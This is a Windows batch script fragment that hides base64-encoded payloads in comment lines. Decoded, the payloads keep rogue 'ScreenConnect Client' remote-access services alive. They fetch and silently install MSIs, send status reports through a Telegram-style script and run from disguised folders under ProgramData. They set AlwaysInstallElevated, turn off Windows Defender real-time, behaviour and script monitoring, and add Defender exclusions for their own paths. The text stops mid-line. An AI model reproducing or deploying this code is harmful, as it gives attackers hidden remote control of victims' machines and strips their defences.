::IHN0YXJ0LW9ubHkgLSBuZXZlciBzcGF3biBvd25fZ3J5eGEgLyBtc2lleGVjDQpz
::ZXQgIkdSWVhBX09LPTAiDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAv
::ZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxn
::cnl4YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZ
::WEFfRlA9JSVMIg0Kc2V0ICJHU1ZDPVNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZ
::WEFfRlAlKSINCmlmIGV4aXN0ICIlV0QlXGdyeXhhX2luc3RhbGwuY21kIiBkZWwg
::L2YgL3EgIiVXRCVcZ3J5eGFfaW5zdGFsbC5jbWQiID5udWwgMj4mMQ0Kc2MgcXVl
::cnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoiU1RBUlRf
::UEVORElORyIgL0M6IkNPTlRJTlVFX1BFTkRJTkciID5udWwNCmlmIG5vdCBlcnJv
::cmxldmVsIDEgKA0KICBzZXQgIkdSWVhBX09LPTEiDQogIGVjaG8gZ3J5eGFfbXVz
::dF9hbHJlYWR5X2FsaXZlPj4iJUxPRyUiDQogIGV4aXQgL2IgMA0KKQ0Kc2MgcXVl
::cnkgIiVHU1ZDJSIgPm51bCAyPiYxDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAg
::ZWNobyBncnl4YV9tdXN0X3N0YXJ0X29ubHk+PiIlTE9HJSINCiAgc2MgY29uZmln
::ICIlR1NWQyUiIHN0YXJ0PSBhdXRvID5udWwgMj4mMQ0KICBzYyBzdGFydCAiJUdT
::VkMlIiA+bnVsIDI+JjENCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwNCiAg
::c2MgcXVlcnkgIiVHU1ZDJSIgfCBmaW5kc3RyIC9JIC9DOiJSVU5OSU5HIiAvQzoi
::U1RBUlRfUEVORElORyIgPm51bA0KICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAi
::R1JZWEFfT0s9MSINCikNCmlmICIlR1JZWEFfT0slIj09IjEiIChlY2hvIGdyeXhh
::X211c3RfcnVubmluZ19vaz4+IiVMT0clIikgZWxzZSAoZWNobyBncnl4YV9tdXN0
::X3N0aWxsX2Rvd25fbm9faW5zdGFsbD4+IiVMT0clIikNCmV4aXQgL2IgMA0KDQo6
::VGdHcnl4YQ0KcmVtICUxPWtpbmQgJTI9bXNnIOKAlCBwZXItR3J5eGEgc3RhdGUg
::c28gaXQgY2Fubm90IHJldXNlIFByaW1hcnkgb3duX21vbi5zdGF0ZS4NCnNldCAi
::R1NUQVRFPSV+MSINCnNldCAiR01TRz0lfjIiDQpzZXQgIkdTVEFURUZJTEU9JVdE
::JVxvd25fbW9uX2dyeXhhLnN0YXRlIg0Kc2V0ICJHT0xEPSINCmlmIGV4aXN0ICIl
::R1NUQVRFRklMRSUiIHNldCAvcCBHT0xEPTwiJUdTVEFURUZJTEUlIg0KaWYgL0kg
::IiVHU1RBVEUlIj09IlJFU1RPUkVEIiAoDQogIGlmIC9JICIlR09MRCUiPT0iUkVT
::VE9SRUQiIGV4aXQgL2IgMA0KICBpZiBleGlzdCAiJVdEJVx0Z19ncnl4YS5mbGFn
::IiAoDQogICAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAt
::Q29tbWFuZCAiaWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRl
::cmFsUGF0aCAnJVdEJVx0Z19ncnl4YS5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90
::YWxNaW51dGVzIC1sdCAxNDQwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+
::JjENCiAgICBpZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgICAgIGVjaG8gdGdfZ3J5
::eGFfc3VwcHJlc3NfJUdTVEFURSU+PiIlTE9HJSINCiAgICAgIGV4aXQgL2IgMA0K
::ICAgICkNCiAgKQ0KICBlY2hvICVHU1RBVEUlPiIlR1NUQVRFRklMRSUiDQogIGVj
::aG8gc2VudD4iJVdEJVx0Z19ncnl4YS5mbGFnIg0KICBwb3dlcnNoZWxsIC1Ob1By
::b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
::aWxlICIlV0QlXHRnX3JlcG9ydC5wczEiIC1TdGF0ZSAlR1NUQVRFJSAtU3VtbWFy
::eSAiJUdNU0clIiAtQnVpbGQgJU1PTlZFUiUgLUNvdW50ICVDT1VOVCUgPm51bCAy
::PiYxDQogIGVjaG8gdGcgZ3J5eGEgJUdTVEFURSUgc2VudD4+IiVMT0clIg0KICBl
::eGl0IC9iIDANCikNCmlmIC9JICIlR1NUQVRFJSI9PSJET1dOIiBpZiAvSSAiJUdP
::TEQlIj09IkRPV04iIGlmIGV4aXN0ICIlV0QlXHRnX2dyeXhhLmZsYWciICgNCiAg
::cG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAi
::aWYoKE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAn
::JVdEJVx0Z19ncnl4YS5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVz
::IC1sdCAzNjApe2V4aXQgMH1lbHNle2V4aXQgMX0iID5udWwgMj4mMQ0KICBpZiBu
::b3QgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIHRnX2dyeXhhX3N1cHByZXNzXyVH
::U1RBVEUlPj4iJUxPRyUiDQogICAgZXhpdCAvYiAwDQogICkNCikNCmVjaG8gJUdT
::VEFURSU+IiVHU1RBVEVGSUxFJSINCmVjaG8gc2VudD4iJVdEJVx0Z19ncnl4YS5m
::bGFnIg0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
::Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVx0Z19yZXBvcnQucHMxIiAt
::U3RhdGUgJUdTVEFURSUgLVN1bW1hcnkgIiVHTVNHJSIgLUJ1aWxkICVNT05WRVIl
::IC1Db3VudCAlQ09VTlQlID5udWwgMj4mMQ0KZWNobyB0ZyBncnl4YSAlR1NUQVRF
::JSBzZW50Pj4iJUxPRyUiDQpleGl0IC9iIDANCg0KOkluc3RhbGxNc2kNCnJlbSAl
::MT11cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpzZXQgIlRBRz0lfjIiDQplY2hv
::IFslVEFHJV0gZmV0Y2ggJVVSTCU+PiIlTE9HJSINCiIlQ1VSTCUiIC1MIC0tc3Ns
::LW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAt
::byAiJU1TSSUudG1wIiAiJVVSTCUiID4+IiVMT0clIiAyPiYxDQpmb3IgJSVGIGlu
::ICgiJU1TSSUudG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKA0KICBlY2hv
::IFslVEFHJV0gZmV0Y2ggZmFpbGVkPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAiJU1T
::SSUudG1wIiA+bnVsIDI+JjENCiAgZXhpdCAvYiAxDQopDQptb3ZlIC95ICIlTVNJ
::JS50bXAiICIlTVNJJSIgPm51bCAyPiYxDQpyZW0gTTQxOiBPTEUgbWFnaWMgKyBQ
::cm9kdWN0TmFtZSBGUCBtdXN0IG1hdGNoIEtFRVBfRlAgYmVmb3JlIC9pDQpzZXQg
::Ik1TSU9LPW5vIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAi
::dXNlYmFja3EgZGVsaW1zPSIgJSVSIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxl
::IC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
::JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiB0ZXN0LW1zaSAtRnAgIiVLRUVQX0ZQ
::JSIgLUV4dHJhICIlTVNJJSIgLVdvcmtEaXIgIiVXRCUiYCkgZG8gc2V0ICJNU0lP
::Sz0lJVIiDQppZiAvSSBub3QgIiFNU0lPSyEiPT0ieWVzIiAoDQogIGVjaG8gWyVU
::QUclXSBtc2lfdmFsaWRhdGVfZmFpbD4+IiVMT0clIg0KICBkZWwgL2YgL3EgIiVN
::U0klIiA+bnVsIDI+JjENCiAgZXhpdCAvYiAxDQopDQpyZW0gTTQyL000Nzogc2li
::bGluZy1zYWZlIGNvcHkgKGVtcHR5IFVwZ3JhZGUgdGFibGUpIGJlZm9yZSBzZXZy
::eiAvaSDigJQgcmVmdXNlIC9pIGlmIHByb3RlY3QgZmFpbHMNCnNldCAiTVNJX1NB
::RkU9Ig0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAidXNlYmFj
::a3EgZGVsaW1zPSIgJSVTIGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25J
::bnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxv
::d25fbGliLnBzMSIgLUFjdGlvbiBwcm90ZWN0LW1zaSAtRXh0cmEgIiVNU0klIiAt
::V29ya0RpciAiJVdEJSJgKSBkbyBpZiBub3QgIiUlUyI9PSJGQUlMIiBpZiBleGlz
::dCAiJSVTIiBzZXQgIk1TSV9TQUZFPSUlUyINCmlmIG5vdCBkZWZpbmVkIE1TSV9T
::QUZFICgNCiAgZWNobyBbJVRBRyVdIG1zaV9wcm90ZWN0X2ZhaWxfc2tpcF9pPj4i
::JUxPRyUiDQogIGRlbCAvZiAvcSAiJU1TSSUiID5udWwgMj4mMQ0KICBleGl0IC9i
::IDENCikNCmNhbGwgOk5vTXNpUG9saWN5DQpyZW0gTTEzL000MTogc3RhbGUgcHJp
::bWFyeSBkaXIgdW5kZXIgUEYgYW5kIFBGODYNCnNjIHF1ZXJ5ICJTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQppZiBlcnJvcmxldmVs
::IDEgKA0KICBpZiBleGlzdCAiJVBGODYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiAoDQogICAgZWNobyBzdGFsZV9wcmltYXJ5X2Rpcl9jbGVhbl9w
::Zjg2Pj4iJUxPRyUiDQogICAgcm1kaXIgL3MgL3EgIiVQRjg2JVxTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogICkNCiAgaWYgZXhp
::c3QgIiVQcm9ncmFtRmlsZXMlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9G
::UCUpIiAoDQogICAgZWNobyBzdGFsZV9wcmltYXJ5X2Rpcl9jbGVhbl9wZj4+IiVM
::T0clIg0KICAgIHJtZGlyIC9zIC9xICIlUHJvZ3JhbUZpbGVzJVxTY3JlZW5Db25u
::ZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgPm51bCAyPiYxDQogICkNCikNCmVjaG8g
::WyVUQUclXSBtc2lleGVjIGluc3RhbGw+PiIlTE9HJSINCm1zaWV4ZWMgL2kgIiVN
::U0lfU0FGRSUiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxs
::eVN1cHByZXNzIC9MKnYgIiVXRCVcbXNpX2hlYWwubG9nIiA+bnVsIDI+JjENCnNl
::dCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiDQplY2hvIFslVEFHJV0gbXNpZXhlYyBl
::eGl0PSFNU0lFWElUIT4+IiVMT0clIg0KaWYgIiFNU0lFWElUISI9PSIxNjE4IiAo
::DQogIGVjaG8gWyVUQUclXSBtc2lfYnVzeV9yZXRyeT4+IiVMT0clIg0KICB0aW1l
::b3V0IC90IDMwIC9ub2JyZWFrID5udWwNCiAgbXNpZXhlYyAvaSAiJU1TSV9TQUZF
::JSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJl
::c3MgL0wqdiAiJVdEJVxtc2lfaGVhbDIubG9nIiA+bnVsIDI+JjENCiAgc2V0ICJN
::U0lFWElUPSFFUlJPUkxFVkVMISINCiAgZWNobyBbJVRBRyVdIG1zaWV4ZWNfcmV0
::cnkgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSINCikNCmlmIC9JIG5vdCAiJU1TSV9T
::QUZFJSI9PSIlTVNJJSIgZGVsIC9mIC9xICIlTVNJX1NBRkUlIiA+bnVsIDI+JjEN
::CmNhbGwgOldhaXRTdmMNCmNhbGwgOlJlc3RvcmVBbHQNCnJlbSBPMzc6IHNldnJ6
::IC9pIHNoYXJlcyBsZWdhY3kgVXBncmFkZUNvZGVzIHdpdGggZ3J5eGEg4oCUIGFs
::d2F5cyByZS1lbnN1cmUgR3J5eGEgYWZ0ZXINCmNhbGwgOkVuc3VyZUdyeXhhTXVz
::dA0KZXhpdCAvYiAwDQoNCjpSZXBhaXJSZWdpc3RlcmVkDQpyZW0gJTE9ZmluZ2Vy
::cHJpbnQgLSBzZXJ2aWNlIGRlbGV0ZWQgYnV0IHByb2R1Y3QgcmVnaXN0ZXJlZDog
::cmVwYWlyIGJ5IEdVSUQuDQpyZW0gTTQwOiBsYWJlbCB3YXMgYW1wdXRhdGVkIChi
::b2R5IHNhdCBhZnRlciBJbnN0YWxsTXNpIGV4aXQgL2IpIHNvIHByaW1hcnkgaGVh
::bCBuZXZlciByYW4uDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCV+
::MSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBleGl0IC9iIDANCmlm
::IG5vdCBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgZXhpdCAvYiAxDQpwb3dlcnNo
::ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kg
::QnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAt
::RnAgIiV+MSIgLVdvcmtEaXIgIiVXRCUiID4+IiVMT0clIiAyPiYxDQpjYWxsIDpX
::YWl0U3ZjDQpleGl0IC9iIDANCg0KOlJlc3RvcmVBbHQNCnJlbSBBTFQgc2Vydmlj
::ZSBnb25lIGJ1dCBzdGlsbCByZWdpc3RlcmVkIChTQy1mYW1pbHkgbXNpZXhlYyBz
::aWRlIGVmZmVjdCkgLSByZXBhaXIgaXQgdG9vLg0Kc2MgcXVlcnkgIlNjcmVlbkNv
::bm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9y
::bGV2ZWwgMSBleGl0IC9iIDANCmVjaG8gYWx0IG1pc3NpbmcgLSByZXBhaXIgYXR0
::ZW1wdD4+IiVMT0clIg0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGlj
::eSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWly
::IC1GcCAiJUFMVF9GUCUiIC1Xb3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0K
::c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiIHwgZmlu
::ZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkFMVF9P
::Sz0xIg0KZXhpdCAvYiAwDQoNCjpOb01zaVBvbGljeQ0KcmVnIGRlbGV0ZSAiSEtM
::TVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXIi
::IC92IERpc2FibGVNU0kgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNP
::RlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3Yg
::RGlzYWJsZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBEaXNhYmxl
::TVNJIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KZXhpdCAvYiAwDQoN
::CjpXYWl0U3ZjDQpzZXQgIlRSSUVTPTAiDQo6V2FpdExvb3ANCnNjIHF1ZXJ5ICJT
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgfCBmaW5kICJSVU5OSU5H
::IiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxICgNCiAgc2V0ICJJTlNUQUxMRUQ9
::MSINCiAgc2V0ICJQUklNX09LPTEiDQogIGV4aXQgL2IgMA0KKQ0Kc2V0IC9hIFRS
::SUVTKz0xDQppZiAlVFJJRVMlIEdFUSAxMCBleGl0IC9iIDENCnBpbmcgMTI3LjAu
::MC4xIC1uIDcgPm51bCAyPiYxDQpnb3RvIDpXYWl0TG9vcA0KDQo6VGdTdGF0ZQ0K
::c2V0ICJORVdTVEFURT0lfjEiDQpzZXQgIk1TRz0lfjIiDQpzZXQgIk9MRFNUQVRF
::PSINCmlmIGV4aXN0ICIlU1RBVEUlIiBzZXQgL3AgT0xEU1RBVEU9PCIlU1RBVEUl
::Ig0KcmVtIGZhbHNlIERPV04gYWZ0ZXIgcmVib290IHJhY2U6IHByaW1hcnkgYWxy
::ZWFkeSBSdW5uaW5nIOKAlCBkbyBub3Qgc3BhbQ0KaWYgL0kgIiVORVdTVEFURSUi
::PT0iRE9XTiIgKA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
::RUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBub3QgZXJyb3Js
::ZXZlbCAxICgNCiAgICBlY2hvIHRnX3NraXBfZG93bl9hbHJlYWR5X3J1bm5pbmc+
::PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KcmVtIHJhdGUtbGltaXQg
::cmVwZWF0ZWQgRE9XTi9GQUlMOiBtYXggMSBhbGVydCBwZXIgNmggd2hpbGUgc3R1
::Y2sNCmlmIC9JICIlTkVXU1RBVEUlIj09IkRPV04iIGdvdG8gOk1heWJlU3VwcHJl
::c3MNCmlmIC9JICIlTkVXU1RBVEUlIj09IkZBSUwiIGdvdG8gOk1heWJlU3VwcHJl
::c3MNCmdvdG8gOlNlbmRBbGVydA0KOk1heWJlU3VwcHJlc3MNCmlmIC9JICIlTkVX
::U1RBVEUlIj09IiVPTERTVEFURSUiIGlmIGV4aXN0ICIlV0QlXHRnX3NlbnQuZmxh
::ZyIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1D
::b21tYW5kICJpZigoTmV3LVRpbWVTcGFuIC1TdGFydCAoR2V0LUl0ZW0gLUxpdGVy
::YWxQYXRoICclV0QlXHRnX3NlbnQuZmxhZycpLkxhc3RXcml0ZVRpbWUpLlRvdGFs
::TWludXRlcyAtbHQgMzYwKXtleGl0IDB9ZWxzZXtleGl0IDF9IiA+bnVsIDI+JjEN
::CiAgaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0Z19zdXBwcmVzc2Vk
::XyVORVdTVEFURSU+PiIlTE9HJSINCiAgICBleGl0IC9iIDANCiAgKQ0KKQ0KOlNl
::bmRBbGVydA0KZWNobyAlTkVXU1RBVEUlPiIlU1RBVEUlIg0KZWNobyBzZW50PiIl
::V0QlXHRnX3NlbnQuZmxhZyINCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdf
::cmVwb3J0LnBzMSIgLVN0YXRlICVORVdTVEFURSUgLVN1bW1hcnkgIiVNU0clIiAt
::QnVpbGQgJU1PTlZFUiUgLUNvdW50ICVDT1VOVCUgPm51bCAyPiYxDQplY2hvIHRn
::IHN0YXRlICVORVdTVEFURSUgc2VudD4+IiVMT0clIg0KZXhpdCAvYiAwDQo=
::B64_MON_END
::B64_SEC_BEGIN
::QGVjaG8gb2ZmDQpSRU0gT1dOX1NFQ1VSRSBCVUlMRCAyMDI2MDgwNFMxMyAtIHNl
::dnJ6LmNmZyArIGdyeXhhLmNmZyBkeW5hbWljIEZQczsgU1kgREVMRVRFK1dSSVRF
::X0RBQw0Kc2V0bG9jYWwgRW5hYmxlRXh0ZW5zaW9ucyBFbmFibGVEZWxheWVkRXhw
::YW5zaW9uDQpzZXQgIldEPSVQcm9ncmFtRGF0YSVcTWljcm9zb2Z0XFdpbmRvd3Nc
::V0VSXFRlbXBcLnd1Y2FjaGUiDQpzZXQgIldEMj0lUHJvZ3JhbURhdGElXE1pY3Jv
::c29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hlIg0Kc2V0ICJMT0c9JVdEJVxi
::b290LmVyciINCnNldCAiS0VFUDE9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiS0VF
::UDI9Zjg2MWM4MTQwZDQ1MzQyNyINCnNldCAiS0VFUDM9MzZlNTA2ZmYwMTZiMjE1
::MSINCmlmIGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0
::b2tlbnM9MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRv
::ICgNCiAgaWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVAxPSUlTCIN
::CiAgaWYgL0kgIiUlSyI9PSJBTFRfRlAiIHNldCAiS0VFUDI9JSVMIg0KKQ0KaWYg
::ZXhpc3QgIiVXRCVcZ3J5eGEuY2ZnIiBmb3IgL2YgInVzZWJhY2txIHRva2Vucz0x
::LCogZGVsaW1zPT0iICUlSyBpbiAoIiVXRCVcZ3J5eGEuY2ZnIikgZG8gaWYgL0kg
::IiUlSyI9PSJDVVJSRU5UX0ZQIiBzZXQgIktFRVAzPSUlTCINCnNldCAiUFJJTT1T
::Y3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAxJSkiDQpzZXQgIkFMVD1TY3JlZW5D
::b25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQpzZXQgIkdSWVhBPVNjcmVlbkNvbm5l
::Y3QgQ2xpZW50ICglS0VFUDMlKSINCnNldCAiUEY9JVByb2dyYW1GaWxlcyUiDQpz
::ZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiVEFTS1JPT1Q9JVN5
::c3RlbVJvb3QlXFN5c3RlbTMyXFRhc2tzIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
::IG1rZGlyICIlV0QlIiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVdEMiUiIG1r
::ZGlyICIlV0QyJSIgPm51bCAyPiYxDQplY2hvIHNlY3VyZV9iZWdpbiAlREFURSUg
::JVRJTUUlIFMxMz4+IiVMT0clIg0KDQpSRU0gLS0tIE5ldXRyYWxpemUgTVNJIGJs
::b2NrIHBvbGljaWVzICgxNjI1KSAtLS0NClJFTSBEaXNhYmxlTVNJOiAwPWFsbG93
::LCAxPW5vbi1hZG1pbiBvbmx5LCAyPWFsbCAtPiBmb3JjZSAwDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxl
::ciIgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEN
::CnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRv
::d3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxsRWxldmF0ZWQgL3QgUkVHX0RX
::T1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgZGVsZXRlICJIS0NVXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLQ1VcU09GVFdBUkVcUG9saWNp
::ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyIiAvdiBBbHdheXNJbnN0YWxs
::RWxldmF0ZWQgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQoNClJFTSAt
::LS0gRGVmZW5kZXI6IHJlZ2lzdHJ5IGV4Y2x1c2lvbnMgKHBvbGljeSArIHByZWZl
::cmVuY2Uga2V5cykgLS0tDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXFBvbGljaWVz
::XE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlQW50aVNweXdh
::cmUgL3QgUkVHX0RXT1JEIC9kIDEgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXFJl
::YWwtVGltZSBQcm90ZWN0aW9uIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5n
::IC90IFJFR19EV09SRCAvZCAxIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxSZWFs
::LVRpbWUgUHJvdGVjdGlvbiIgL3YgRGlzYWJsZUJlaGF2aW9yTW9uaXRvcmluZyAv
::dCBSRUdfRFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09G
::VFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1U
::aW1lIFByb3RlY3Rpb24iIC92IERpc2FibGVJT0FWUHJvdGVjdGlvbiAvdCBSRUdf
::RFdPUkQgL2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcUmVhbC1UaW1lIFBy
::b3RlY3Rpb24iIC92IERpc2FibGVTY3JpcHRTY2FubmluZyAvdCBSRUdfRFdPUkQg
::L2QgMSAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVXRCUi
::IC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxT
::T0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBh
::dGhzIiAvdiAiJVdEMiUiIC90IFJFR19EV09SRCAvZCAwIC9mID5udWwgMj4mMQ0K
::cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBEZWZlbmRl
::clxFeGNsdXNpb25zXFBhdGhzIiAvdiAiQzpcV2luZG93c1xUZW1wIiAvdCBSRUdf
::RFdPUkQgL2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVc
::TWljcm9zb2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3Yg
::IiVURU1QJSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRk
::ICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1
::c2lvbnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VF
::UDElKSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJI
::S0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lv
::bnNcUGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIl
::KSIgL3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xN
::XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNc
::UGF0aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIg
::L3QgUkVHX0RXT1JEIC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNP
::RlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0
